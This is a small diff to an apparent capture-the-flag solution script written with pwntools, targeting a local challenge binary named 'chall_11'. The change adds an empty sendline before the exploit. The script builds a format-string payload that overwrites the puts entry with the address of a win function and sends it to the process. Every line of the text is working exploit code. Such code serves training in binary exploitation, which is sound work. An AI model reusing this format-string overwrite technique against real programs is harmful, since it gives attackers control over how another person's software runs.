@@ -1,6 +1,7 @@
 from pwn import *
 binary = context.binary = ELF('./chall_11')
 p = process(binary.path)
+p.sendline()
 offset = 10
 payload = fmtstr_payload(offset,{binary.sym.puts:binary.sym.win})
 p.sendline(payload)
